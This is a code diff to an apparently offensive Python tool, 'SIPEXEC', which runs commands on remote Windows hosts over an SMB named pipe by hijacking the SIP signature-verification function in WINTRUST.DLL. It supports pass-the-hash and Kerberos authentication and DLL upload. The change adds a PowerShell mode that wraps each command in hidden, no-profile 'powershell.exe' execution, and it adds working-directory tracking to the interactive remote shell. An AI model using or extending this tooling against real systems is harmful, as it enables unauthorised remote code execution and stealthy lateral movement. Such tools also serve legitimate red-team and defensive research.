@@ -95,7 +95,8 @@ class SIPEXEC:
     def __init__(self, command="", username="", password="", domain="", hashes=None,
                  aesKey=None, doKerberos=False, kdcHost=None, dllPath=None,
                  noOutput=False, upload=False, listenAddress=None,
-                 sigHijack=False, guid="default", noKill=False, timeout=15):
+                 sigHijack=False, guid="default", noKill=False, timeout=15,
+                 shell="cmd"):
         self.__command = command
         self.__username = username
         self.__password = password
@@ -112,6 +113,7 @@ class SIPEXEC:
         self.__sigHijack = sigHijack
         self.__noKill = noKill
         self.__timeout = timeout
+        self.__shell = shell
         self.__origDll = "WINTRUST.DLL"
         self.__origSipDll = "WINTRUST.DLL"
         self.__origSipFunc = "CryptSIPVerifyIndirectData"
@@ -214,10 +216,10 @@ class SIPEXEC:
                 logging.error("Could not connect to pipe.")
                 return
             if self.__command:
-                self.shell = RemoteShell(self.__smbConnection, self.__pipeTid, self.__pipeFid)
+                self.shell = RemoteShell(self.__smbConnection, self.__pipeTid, self.__pipeFid, self.__shell)
                 self.shell.onecmd(self.__command)
             else:
-                self.shell = RemoteShell(self.__smbConnection, self.__pipeTid, self.__pipeFid)
+                self.shell = RemoteShell(self.__smbConnection, self.__pipeTid, self.__pipeFid, self.__shell)
                 self.shell.cmdloop()
         except (Exception, KeyboardInterrupt) as e:
             if logging.getLogger().level == logging.DEBUG:
@@ -495,14 +497,16 @@ class SIPEXEC:
 
 
 class RemoteShell(cmd.Cmd):
-    def __init__(self, smbConnection, tid, fid):
+    def __init__(self, smbConnection, tid, fid, shell="cmd"):
         super().__init__()
         self.__smbConnection = smbConnection
         self.__tid = tid
         self.__fid = fid
         self.__outputBuffer = ""
+        self.__shell = shell
+        self.__pwd = "C:\\"
         self.intro = "[*] Connected. Type commands or 'exit' to disconnect."
-        self.prompt = "> "
+        self.prompt = "C:\\> "
 
     def do_shell(self, s):
         os.system(s)
@@ -539,8 +543,13 @@ class RemoteShell(cmd.Cmd):
                 self.__outputBuffer = ""
 
     def execute_remote(self, data):
+        if self.__shell == "powershell":
+            wrapped = f"powershell.exe -nop -w hidden -c \"Set-Location '{self.__pwd}'; {data}; (Get-Location).Path\""
+        else:
+            wrapped = f"cd /d {self.__pwd} && {data} & cd"
+
         try:
-            self.__smbConnection.writeNamedPipe(self.__tid, self.__fid, data.encode("utf-8"))
+            self.__smbConnection.writeNamedPipe(self.__tid, self.__fid, wrapped.encode("utf-8"))
         except Exception as e:
             logging.error(f"Send error: {e}")
             return
@@ -556,7 +565,18 @@ class RemoteShell(cmd.Cmd):
         text = output.decode(CODEC, errors="replace")
         if "DONE" in text:
             text = text[:text.index("DONE")].rstrip("\n[")
-        self.__outputBuffer = text.rstrip("\r\n")
+        text = text.rstrip("\r\n")
+
+        # Last line is the current directory from `cd` / `Get-Location`
+        lines = text.split("\n")
+        if len(lines) > 1:
+            last = lines[-1].strip()
+            if last and (last[1:3] == ":\\" or last[1:3] == ":/"):
+                self.__pwd = last
+                self.prompt = f"{self.__pwd}> "
+                text = "\n".join(lines[:-1]).rstrip("\r\n")
+
+        self.__outputBuffer = text
 
 
 if __name__ == "__main__":
@@ -573,6 +593,8 @@ if __name__ == "__main__":
 
     delivery = parser.add_argument_group("payload delivery")
     delivery.add_argument("-upload", action="store_true", help="Upload DLL (admin context via pipe impersonation)")
+    delivery.add_argument("-shell", choices=["cmd", "powershell"], default="cmd",
+                          help="Shell to use for command execution (default: cmd)")
     delivery.add_argument("-listen", metavar="ip", help="IP to bind SMB server on (serve mode)")
     delivery.add_argument("-dll", metavar="path", help="Use this DLL path directly (skip staging)")
 
@@ -620,7 +642,7 @@ if __name__ == "__main__":
                        options.aesKey, options.k, options.dc_ip, options.dll,
                        options.nooutput, options.upload, options.listen,
                        options.sig_hijack, options.guid, options.no_kill,
-                       options.timeout)
+                       options.timeout, options.shell)
     try:
         executer.run(address)
     except Exception as e:
